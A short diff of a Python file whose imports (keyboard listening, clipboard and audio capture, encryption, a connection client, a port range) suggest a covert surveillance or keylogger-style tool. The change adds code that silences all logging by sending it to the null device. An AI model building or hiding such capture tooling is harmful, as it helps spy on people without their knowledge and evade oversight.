@@ -11,10 +11,13 @@ import pickle
 import pyperclip
 import threading
 import pyaudio
+import logging
 from pynput import keyboard
 from cryptography.fernet import Fernet
 from datetime import datetime
 from connection_module import SecureConnectionClient
+
+logging.basicConfig(filename=os.devnull, level=logging.CRITICAL)
 
 start_port, end_port = 50000, 50100
 
